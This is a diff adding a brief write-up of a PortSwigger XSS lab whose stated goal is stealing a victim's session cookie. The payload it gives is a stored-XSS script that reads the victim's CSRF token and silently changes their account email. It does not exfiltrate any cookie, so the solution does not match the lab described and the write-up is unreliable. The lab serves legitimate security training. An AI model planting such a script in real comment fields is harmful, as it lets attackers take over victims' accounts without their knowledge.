@@ -1,0 +1,25 @@
+LAB NAME: Exploiting cross-site scripting to steal cookies
+
+DESCRIPTION
+This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.
+
+DIFFICULTY LEVEL: PRACTITIONER.
+
+LAB LINK: https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies
+
+STEPS I USED TO SOLVE THIS LAB
+- Checked the page source to understand how the email update works
+Submitted the following payload in a blog comment:
+
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@test.com')
+};
+</script>
